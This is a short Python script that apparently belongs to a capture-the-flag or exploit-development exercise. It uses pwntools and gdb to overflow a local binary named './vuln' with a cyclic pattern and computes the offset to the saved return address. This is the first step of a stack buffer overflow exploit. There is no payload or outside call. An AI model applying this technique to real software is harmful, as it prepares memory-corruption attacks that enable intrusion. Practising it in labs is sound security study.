#!/usr/bin/env python

"""
Get return address offset using pwntools.
"""

from pwn import *

need_crash = False

if need_crash == True:
    # Start debugger.
    io = gdb.debug("./vuln")

    # Send cyclic pattern to create overflow.
    pattern = cyclic(512, n=8)
    io.sendline(pattern)

    pause()

    # Once you get a message such as this, compute the offset.
    # RBP: 0x6161616161616169 ('iaaaaaaa')
    # RSP: 0x7ffe86e5e238 ("jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaa")
    # RIP: 0x400653 (<reader+71>:	ret)
else:
    # Use value from above step
    rbp_value = 0x6161616161616169
    offset = cyclic_find(rbp_value, n=8) + 8
    log.info("offset: {:d}".format(offset))
